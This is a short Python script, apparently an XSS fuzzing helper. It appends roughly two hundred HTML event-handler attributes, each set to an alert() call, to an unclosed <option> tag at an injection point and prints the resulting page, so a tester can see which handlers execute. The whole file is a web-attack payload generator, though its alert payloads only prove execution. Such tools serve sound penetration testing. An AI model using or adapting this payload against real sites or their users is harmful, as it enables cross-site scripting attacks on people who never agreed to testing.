#replace prefix and suffix with your own HTML before and after the injection point
prefix =  """
    <html>
	<select name="selectedName" multiple="multiple" size="10" ondblclick="doubleClickRemove(this)" style="width: 240px;">
	<option value="name" style="font-size:60px;"
	"""
attack = ""

events = "DOMContentLoaded,DOMFrameContentLoaded,DOMMouseScroll,DOMMenuItemActive,DOMMenuItemInactive,FSCommand,formchange,forminput,invalid,msVisibilityChange,onAbort,onActivate,onAfterPrint,onAfterUpdate,onAttrModified,onBack,onBeforeActivate,onBeforeCopy,onBeforeCut,onBeforeDeactivate,onBeforeEditFocus,onBeforePaste,onBeforePrint,onBeforeUnload,onBeforeUpdate,onBegin,onBlur,onBounce,onBroadcast,onCanPlay,onCanPlayThrough,onCellChange,onChange,onCharacterDataModified,onClick,onClose,onCommand,onCommandUpdate,onContextMenu,onControlSelect,onCopy,onCut,onDataAvailable,onDataSetChanged,onDataSetComplete,onDblClick,onDeactivate,onDOMActivate,onDOMAttrModified,onDOMAttributeNameChanged,onDOMCharacterDataModified,onDOMElementNameChanged,onDOMFocusIn,onDOMFocusOut,onDOMNodeInserted,onDOMNodeInsertedIntoDocument,onDOMNodeRemoved,onDOMNodeRemovedFromDocument,onDOMSubTreeModified,onDrag,onDragDrop,onDragEnd,onDragEnter,onDragExit,onDragGesture,onDragLeave,onDragOver,onDragStart,onDrop,onDurationChange,onEmtied,onEnded,onEnd,onError,onErrorUpdate,onExit,onFilterChange,onFinish,onFocus,onFocusIn,onFocusOut,onFormChange,onFormInput,onForward,onHashChange,onHelp,onInput,onInvalid,onKeyDown,onKeyPress,onKeyUp,onLayoutComplete,onLoad,onLoadedData,onLoadedMetaData,onLoadStart,onLocate,onLoseCapture,onMediaComplete,onMediaError,onMessage,onMouseDown,onMouseDrag,onMouseEnter,onMouseLeave,onMouseMove,onMouseMultiWheel,onMouseOut,onMouseOver,onMouseUp,onMouseWheel,onMove,onMoveEnd,onMoveStart,onmsGestureChange,onmsGestureDoubleTap,onmsGestureEnd,onmsGestureHold,onmsGestureStart,onmsGestureTap,onmsSiteModeJumpListitemRemoved,onmsSiteModeShowJumpList ,onmsThumbnailClick ,onNodeInserted,onNodeRemoved,onOffline,onOnline,onOutOfSync,onOverFlow,onOverFlowChanged,onPage,onPageHide,onPageShow,onPaste,onPause,onPlay,onPlaying,onPopState,onPopupHidden,onPopupHiding,onPopupShowing,onPopupShown,onProgress,onPropertyChange,onRateChange,onReadyStateChange,onRedo,onRepeat,onReset,onResize,onResizeEnd,onResizeStart,onResume,onReverse,onRowDelete,onRowEnter,onRowExit,onRowInserted,onRowsDelete,onRowsInserted,onScroll,onSearch,onSeek,onSeeked,onSeeking,onSelect,onSelectionChange,onSelectStart,onShow,onStalled,onStart,onStop,onStorage,onStorageCommit,onSubmit,onSubTreeModified,onSuspend,onSyncRestored,onSynchRestored,onText,onTextInput,onTimeError,onTimeuout,onTimeupdate,onTrackChange,onUnderflow,onUndo,onUnload,onURLFlip,onVolumeChange,onWaiting,onXfer_Done,onwebkitanimationend,onwebkitanimationiteration,onwebkitanimationstart,onwebkittransitionend,seekSegmentTime,onSelectionChamge,onCheckboxStateChange,onRadioStateChange"

for e in events.split(","):
    attack += e + "=alert('" + e + "') "

suffix = """>name</option></select>
         </html>"""

print prefix + attack + suffix
